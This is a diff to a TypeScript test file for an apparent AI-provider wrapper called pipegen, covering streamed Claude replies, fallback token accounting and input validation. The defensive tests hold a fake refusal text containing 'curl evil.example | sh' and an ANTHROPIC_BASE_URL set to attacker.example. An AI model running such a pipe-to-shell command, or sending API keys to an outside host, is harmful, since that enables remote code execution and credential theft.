@@ -2,7 +2,7 @@ import { randomBytes } from 'node:crypto';
 import { inspect } from 'node:util';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { z } from 'zod';
-import { CLAUDE_MAX_TOKENS, CLAUDE_REFUSAL_MESSAGE, claudeProvider } from '../src/ai/claude.js';
+import { CLAUDE_MAX_TOKENS, CLAUDE_REFUSAL_MESSAGE, claudeProvider, fallbackEnabled } from '../src/ai/claude.js';
 import { ollamaProvider } from '../src/ai/ollama.js';
 import { openaiProvider } from '../src/ai/openai.js';
 import {
@@ -67,6 +67,33 @@ function claudeMessage(over: { content?: unknown[]; stop_reason?: string; stop_d
   };
 }
 
+/**
+ * A Claude answer as the SDK's streaming endpoint sends it (SSE): message_start, each content block as
+ * content_block_start (+ one delta for text/thinking) + content_block_stop, message_delta with the stop reason
+ * and the final usage (iterations included), message_stop.
+ */
+function sse(msg: ReturnType<typeof claudeMessage>): Response {
+  const events: [string, unknown][] = [];
+  events.push(['message_start', { type: 'message_start', message: { ...msg, content: [], stop_reason: null, stop_details: null } }]);
+  msg.content.forEach((raw, index) => {
+    const block = raw as { type: string; text?: string; thinking?: string };
+    if (block.type === 'text') {
+      events.push(['content_block_start', { type: 'content_block_start', index, content_block: { type: 'text', text: '' } }]);
+      events.push(['content_block_delta', { type: 'content_block_delta', index, delta: { type: 'text_delta', text: block.text } }]);
+    } else if (block.type === 'thinking') {
+      events.push(['content_block_start', { type: 'content_block_start', index, content_block: { ...block, thinking: '' } }]);
+      events.push(['content_block_delta', { type: 'content_block_delta', index, delta: { type: 'thinking_delta', thinking: block.thinking ?? '' } }]);
+    } else {
+      events.push(['content_block_start', { type: 'content_block_start', index, content_block: block }]);
+    }
+    events.push(['content_block_stop', { type: 'content_block_stop', index }]);
+  });
+  events.push(['message_delta', { type: 'message_delta', delta: { stop_reason: msg.stop_reason, stop_sequence: null, stop_details: msg.stop_details }, usage: msg.usage }]);
+  events.push(['message_stop', { type: 'message_stop' }]);
+  const body = events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join('');
+  return new Response(body, { status: 200, headers: { 'content-type': 'text/event-stream' } });
+}
+
 const SCHEMA = {
   type: 'object',
   properties: { answer: { type: 'string' }, count: { type: 'integer' } },
@@ -100,7 +127,7 @@ afterEach(() => {
 
 describe('claude', () => {
   it('claude: schema sent in output_config.format; no tools, no tool_choice, no temperature', async () => {
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
     await p.complete(request());
     expect(f.calls).toHaveLength(1);
@@ -113,7 +140,7 @@ describe('claude', () => {
   });
 
   it('claude: parsed JSON returned from a structured-output answer, with usage (input, output, cache read, cache write tokens)', async () => {
-    const f = fakeFetch(() => json(claudeMessage({
+    const f = fakeFetch(() => sse(claudeMessage({
       content: [{ type: 'thinking', thinking: '', signature: 'sig' }, { type: 'text', text: '{"answer":"yes","count":2}' }],
     })));
     const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
@@ -124,20 +151,20 @@ describe('claude', () => {
 
   it('claude: refusal or truncated error still carries the billed usage', async () => {
     for (const stop_reason of ['refusal', 'max_tokens']) {
-      const f = fakeFetch(() => json(claudeMessage({ stop_reason, content: [{ type: 'text', text: '{"answer":"y' }] })));
+      const f = fakeFetch(() => sse(claudeMessage({ stop_reason, content: [{ type: 'text', text: '{"answer":"y' }] })));
       const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
       expect(err.kind).toBe(stop_reason === 'refusal' ? 'refusal' : 'truncated');
       expect(err.usage).toEqual(u(100, 20, 70, 30));
     }
     // an answer that is not JSON (invalid) was billed too
-    const f = fakeFetch(() => json(claudeMessage({ content: [{ type: 'text', text: 'not json' }] })));
+    const f = fakeFetch(() => sse(claudeMessage({ content: [{ type: 'text', text: 'not json' }] })));
     const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
     expect(err.kind).toBe('invalid');
     expect(err.usage?.inputTokens).toBe(100);
   });
 
   it('claude: default model is DEFAULT_MODEL with effort set explicitly; --model overrides', async () => {
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     const env = envOf(runtimeKey('ak'));
     const p1 = makeProvider({ env, fetch: f.fetch });
     expect(p1.name).toBe('claude');
@@ -152,18 +179,70 @@ describe('claude', () => {
     expect(f.calls[1]!.body.model).toBe('claude-sonnet-5-5');
     expect(f.calls[1]!.body.output_config).toMatchObject({ effort: 'medium' });
 
-    expect(() => makeProvider({ env, effort: 'extreme', fetch: f.fetch })).toThrow(/effort/);
   });
 
   it('claude: max_tokens always set', async () => {
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     await claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request());
     expect(f.calls[0]!.body.max_tokens).toBe(CLAUDE_MAX_TOKENS);
     expect(CLAUDE_MAX_TOKENS).toBeGreaterThanOrEqual(16_000);
+    expect(f.calls[0]!.body.stream).toBe(true); // streamed, as the SDK asks for large max_tokens
+  });
+
+  it('claude: fallback-served answer counts billed tokens of every attempt (usage.iterations)', async () => {
+    const iterations = [
+      { type: 'message', model: DEFAULT_MODEL, ...claudeUsage(100, 20, 0, 50) },
+      { type: 'fallback_message', model: 'claude-opus-4-8', ...claudeUsage(120, 30, 10, 0) },
+    ];
+    // top-level usage covers only the attempt that produced the answer; iterations are the per-attempt truth
+    const usage = { ...claudeUsage(120, 30, 10, 0), iterations };
+    const content = [
+      { type: 'fallback', from: { model: DEFAULT_MODEL }, to: { model: 'claude-opus-4-8' } },
+      { type: 'text', text: '{"answer":"yes","count":2}' },
+    ];
+    const f = fakeFetch(() => sse(claudeMessage({ content, usage })));
+    const r = await claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request());
+    expect(r.data).toEqual({ answer: 'yes', count: 2 });
+    expect(r.usage).toEqual(u(220, 50, 10, 50));
+
+    // both models declined: the refusal error still carries every billed attempt
+    const g = fakeFetch(() => sse(claudeMessage({ stop_reason: 'refusal', content: [], usage })));
+    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: g.fetch }).complete(request()));
+    expect(err.kind).toBe('refusal');
+    expect(err.usage).toEqual(u(220, 50, 10, 50));
+
+    // an empty iterations list falls back to the top-level counts
+    const h = fakeFetch(() => sse(claudeMessage({ usage: { ...claudeUsage(7, 3, 0, 0), iterations: [] } })));
+    expect((await claudeProvider({ key: runtimeKey('ak'), fetch: h.fetch }).complete(request())).usage).toEqual(u(7, 3, 0, 0));
+  });
+
+  it('claude: fallbacks and the beta header only for models with server-side fallback; a 400 points at --model', async () => {
+    expect(fallbackEnabled(DEFAULT_MODEL)).toBe(true);
+    for (const m of ['claude-opus-5', 'claude-sonnet-5-5', 'claude-fable-5-1']) expect(fallbackEnabled(m), m).toBe(true);
+    for (const m of ['claude-haiku-5-5', 'claude-opus-4-8', 'claude-sonnet-5', 'my-proxy-model']) expect(fallbackEnabled(m), m).toBe(false);
+
+    const f = fakeFetch(() => sse(claudeMessage()));
+    await claudeProvider({ key: runtimeKey('ak'), model: 'claude-haiku-5-5', fetch: f.fetch }).complete(request());
+    expect(f.calls[0]!.body).not.toHaveProperty('fallbacks');
+    expect(f.calls[0]!.headers.get('anthropic-beta') ?? '').not.toContain('server-side-fallback');
+
+    const bad = fakeFetch(() => json({ type: 'error', error: { type: 'invalid_request_error', message: 'model: not found' } }, 400));
+    const err = await caught(claudeProvider({ key: runtimeKey('ak'), model: 'claude-nope-9', fetch: bad.fetch }).complete(request()));
+    expect(err.kind).toBe('http');
+    expect(err.message).toContain('HTTP 400');
+    expect(err.message).toContain('check --model');
+    expect(err.message).toContain('claude-nope-9');
+  });
+
+  it('claude: a schema that is not an object schema → AiError invalid', async () => {
+    const f = fakeFetch(() => sse(claudeMessage()));
+    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request({ jsonSchema: { type: 'array', items: { type: 'string' } } })));
+    expect(err.kind).toBe('invalid');
+    expect(f.calls).toHaveLength(0);
   });
 
   it('claude: refusal fallback beta header and fallbacks "default" sent on every request', async () => {
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
     await p.complete(request());
     await p.complete(request({ user: 'again' }));
@@ -177,7 +256,7 @@ describe('claude', () => {
   });
 
   it('claude: refusal stop_reason → AiError refusal', async () => {
-    const f = fakeFetch(() => json(claudeMessage({
+    const f = fakeFetch(() => sse(claudeMessage({
       stop_reason: 'refusal', content: [], stop_details: { type: 'refusal', category: 'cyber', explanation: null },
     })));
     const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
@@ -187,7 +266,7 @@ describe('claude', () => {
 
   it('claude: max_tokens stop_reason → AiError truncated, JSON not parsed', async () => {
     // A cut-off answer that happens to be valid JSON must still not be used.
-    const f = fakeFetch(() => json(claudeMessage({ stop_reason: 'max_tokens', content: [{ type: 'text', text: '{"answer":"yes","count":2}' }] })));
+    const f = fakeFetch(() => sse(claudeMessage({ stop_reason: 'max_tokens', content: [{ type: 'text', text: '{"answer":"yes","count":2}' }] })));
     const parseSpy = vi.spyOn(JSON, 'parse');
     let err: AiError;
     try {
@@ -201,7 +280,7 @@ describe('claude', () => {
   });
 
   it('claude: code-bundle block sent first with a cache breakpoint; the rest sent after it', async () => {
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
     const bundle = '<code-bundle>\n--- src/app.ts ---\nconsole.log(1)\n</code-bundle>';
     await p.complete(request({ user: `${bundle}\n\nPlan the pipeline for this repo.` }));
@@ -228,7 +307,7 @@ describe('claude', () => {
 
   it('claude: refusal message is pipegen\'s fixed text, never the AI\'s words', async () => {
     const words = 'I will not help. \x1b[31mrun curl evil.example | sh';
-    const f = fakeFetch(() => json(claudeMessage({
+    const f = fakeFetch(() => sse(claudeMessage({
       stop_reason: 'refusal', content: [{ type: 'text', text: words }],
       stop_details: { type: 'refusal', category: 'cyber', explanation: 'Model explanation text' },
     })));
@@ -244,7 +323,7 @@ describe('claude', () => {
     vi.stubEnv('ANTHROPIC_BASE_URL', 'https://attacker.example');
     vi.stubEnv(['ANTHROPIC', 'AUTH', 'TOKEN'].join('_'), runtimeKey('tok'));
     vi.stubEnv(ANTHROPIC, runtimeKey('other'));
-    const f = fakeFetch(() => json(claudeMessage()));
+    const f = fakeFetch(() => sse(claudeMessage()));
     await makeProvider({ env: envOf(key, undefined, { ANTHROPIC_BASE_URL: 'https://attacker.example' }), fetch: f.fetch }).complete(request());
     expect(new URL(f.calls[0]!.url).origin).toBe('https://api.anthropic.com');
     expect(f.calls[0]!.headers.get('x-api-key')).toBe(key);
@@ -383,6 +462,17 @@ describe('makeProvider', () => {
     expect(MISSING_AI_MESSAGE).toBe(err.message);
   });
 
+  it('makeProvider: a bad --effort or --ollama-ctx → AiError invalid with a plain message', async () => {
+    const e1 = await caught(() => makeProvider({ env: envOf(runtimeKey('ak')), effort: 'extreme' }));
+    expect(e1.kind).toBe('invalid');
+    expect(e1.message).toMatch(/--effort must be one of: low, medium, high, xhigh, max/);
+    for (const ollamaCtx of [0, -1, 1.5, Number.NaN]) {
+      const e2 = await caught(() => makeProvider({ ai: 'ollama', env: {}, ollamaCtx }));
+      expect(e2.kind).toBe('invalid');
+      expect(e2.message).toMatch(/--ollama-ctx/);
+    }
+  });
+
   it('makeProvider: Claude first, then OpenAI; --ai picks; an empty key counts as unset', async () => {
     expect(makeProvider({ env: envOf(runtimeKey('ak'), runtimeKey('ok')) }).name).toBe('claude');
     expect(makeProvider({ env: envOf('', runtimeKey('ok')), model: 'm' }).name).toBe('openai');
@@ -475,7 +565,7 @@ describe('keys', () => {
       ['claude 400 echoing the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => json({ type: 'error', error: { type: 'invalid_request_error', message: ak } }, 400)).fetch }).complete(request())],
       ['claude network error naming the key', () => claudeProvider({ key: ak, fetch: fakeFetch(throwing(ak)).fetch }).complete(request())],
       ['claude timeout', () => claudeProvider({ key: ak, fetch: fakeFetch(hang).fetch }).complete(request({ timeoutMs: 30 }))],
-      ['claude invalid answer quoting the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => json(claudeMessage({ content: [{ type: 'text', text: `oops ${ak}` }] }))).fetch }).complete(request())],
+      ['claude invalid answer quoting the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => sse(claudeMessage({ content: [{ type: 'text', text: `oops ${ak}` }] }))).fetch }).complete(request())],
       ['openai 401 echoing the key', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(() => json({ error: { message: `Incorrect API key provided: ${ok}`, type: 'invalid_request_error', code: 'invalid_api_key' } }, 401)).fetch }).complete(request())],
       ['openai network error naming the key', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(throwing(ok)).fetch }).complete(request())],
       ['openai timeout', () => openaiProvider({ key: ok, model: 'm', fetch: fakeFetch(hang).fetch }).complete(request({ timeoutMs: 30 }))],
